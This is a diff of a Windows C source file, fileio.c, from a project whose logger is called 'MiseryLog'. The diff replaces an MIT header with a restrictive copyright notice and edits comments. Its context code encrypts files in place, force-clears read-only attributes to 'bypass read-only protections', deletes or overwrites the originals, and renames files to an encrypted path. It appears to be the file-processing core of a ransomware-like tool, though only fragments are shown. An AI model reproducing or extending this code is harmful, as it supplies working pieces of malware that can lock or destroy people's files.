@@ -1,5 +1,14 @@
-// SPDX-License-Identifier: MIT
-// fileio.c - Heavy lifting: disk reads/writes, buffer allocation, crypto calls
+
+// fileio.c 
+/* Author: Jahanzaib Ashraf Mir
+
+Copyright © 2026. All Rights Reserved.
+
+No part of this script may be reproduced,published,
+distributed, modified,or executed on any unauthorized systems,
+networks, or servers, by any means or in any form,
+without the prior written permission of the copyright owner.
+Unauthorized use, deployment, or duplication is strictly prohibited and may result in legal action.*/
 
 #include "fops_internal.h"
 #include "fops_log.h"
@@ -20,7 +29,7 @@ void FopsProcessFileIO(FILEOPS_CTX *ctx, const char *narrowPath) {
         goto cleanup;
     }
 
-    // IMPROVEMENT: Added FILE_FLAG_SEQUENTIAL_SCAN for faster disk caching
+    //  Added FILE_FLAG_SEQUENTIAL_SCAN for faster disk caching
     hFile = CreateFileA(narrowPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
     if (hFile == INVALID_HANDLE_VALUE) goto cleanup;
 
@@ -66,7 +75,7 @@ void FopsProcessFileIO(FILEOPS_CTX *ctx, const char *narrowPath) {
         if (pathLen > FILEOPS_MAX_PATH - 5) goto cleanup;
         memcpy(tmpPath, origPath, pathLen); memcpy(tmpPath + pathLen, ".tmp", 5);
 
-        // IMPROVEMENT: Removed FILE_SHARE_READ on write handle for security
+        //  Removed FILE_SHARE_READ on write handle for security
         HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
         if (hWrite == INVALID_HANDLE_VALUE) goto cleanup;
 
@@ -74,11 +83,11 @@ void FopsProcessFileIO(FILEOPS_CTX *ctx, const char *narrowPath) {
         CloseHandle(hWrite);
         if (!writeOk || wr != decLen) { DeleteFileA(tmpPath); goto cleanup; }
         
-        // FIX: Force remove read-only attribute to prevent atomic swap failures
+        //Force remove read-only attribute to prevent atomic swap failures
         SetFileAttributesA(origPath, FILE_ATTRIBUTE_NORMAL);
         if (!MoveFileExA(tmpPath, origPath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) { DeleteFileA(tmpPath); goto cleanup; }
 
-        // FIX: Force remove read-only attribute before deleting leftover encrypted file
+        // Force remove read-only attribute before deleting leftover encrypted file
         SetFileAttributesA(narrowPath, FILE_ATTRIBUTE_NORMAL);
         DeleteFileA(narrowPath);
         
@@ -114,7 +123,7 @@ void FopsProcessFileIO(FILEOPS_CTX *ctx, const char *narrowPath) {
         CloseHandle(hWrite);
         if (!writeOk || wr != encLen) { DeleteFileA(tmpPath); goto cleanup; }
         
-        // FIX: Bypass read-only protections for atomic swap
+        //  Bypass read only protections for atomic swap
         SetFileAttributesA(narrowPath, FILE_ATTRIBUTE_NORMAL);
         if (!MoveFileExA(tmpPath, narrowPath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) { DeleteFileA(tmpPath); goto cleanup; }
 
@@ -125,7 +134,7 @@ void FopsProcessFileIO(FILEOPS_CTX *ctx, const char *narrowPath) {
         
         SetFileAttributesA(narrowPath, FILE_ATTRIBUTE_NORMAL);
         if (!MoveFileExA(narrowPath, encPath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
-            // FIX: Critical fallback. If this rename fails, the next run will double-encrypt the ciphertext, corrupting it forever.
+            //  Critical fallback. If this rename fails, the next run will double-encrypt the ciphertext, corrupting it forever.
             if (!MoveFileA(narrowPath, encPath)) {
                 MiseryLog(MISERY_LOG_ERROR, "FileOps: Critical rename failed, data preserved in: %s", narrowPath);
             }
